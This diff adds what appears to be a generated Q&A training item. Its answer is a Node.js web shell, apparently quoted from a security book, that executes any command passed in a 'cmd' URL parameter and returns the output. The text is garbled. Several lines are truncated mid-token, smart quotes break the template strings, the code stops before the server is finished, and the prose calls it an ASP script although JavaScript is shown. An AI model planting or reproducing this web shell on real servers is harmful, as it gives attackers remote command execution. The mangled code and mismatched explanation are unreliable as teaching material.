@@ -1,0 +1,32 @@
+TECHNIQUE / QUESTION:
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+This ASP script creates a web shell that executes commands passed via the
+cmd query string parameter and returns the output.
+Example 6-3 shows a web shell example in JavaScript (Node.js).
+Example 6-3 Web Shell in JavaScript (Node.js)
+const http = require('http');
+const { exec } = require('child_process');
+http.createServer((req, res) => {
+const url = new URL(req.url, “http://${req.headers.
+const cmd = url.searchParams.get('cmd');
+if (cmd) {
+exec(cmd, (error, stdout, stderr) => {
+if (error) {
+res.writeHead(500, { 'Content-Type': 'text/pl
+res.end(“Error: ${stderr}”);
+return;
+}
+res.writeHead(200, { 'Content-Type': 'text/plai
+res.end(stdout);
+});
+} else {
+res.writeHead(400, { 'Content-Type': 'text/plain
+res.end('No command specified');
+}
